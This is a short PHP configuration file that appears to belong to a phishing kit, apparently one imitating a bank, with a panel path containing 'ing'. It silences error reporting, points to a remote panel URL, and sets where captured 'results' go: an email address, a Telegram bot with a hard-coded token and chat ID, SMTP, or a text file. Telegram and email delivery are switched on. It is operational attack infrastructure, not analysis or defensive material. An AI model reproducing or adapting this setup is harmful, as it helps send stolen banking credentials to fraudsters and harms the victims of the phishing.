<?php
    
    session_start();
    error_reporting(0);
    
    include '../inc/Route.php';
    include '../inc/vendor/autoload.php';
    include '../inc/functions.php';
    include '../inc/panel.php';
    define('BASEPATH',getMainPath());
    define('MAIN', $_SERVER['DOCUMENT_ROOT'] . getMainPath());
    define('PANEL', "https://freebridge.fr/ing/panel/");

    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '1300314475:AAHCP-48eChaKFgwZije6JFH6yWxOuoGYGY');
    define("TELEGRAM_CHAT_ID", '779453442');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');

    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RECEIVE_VIA_EMAIL", 1); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>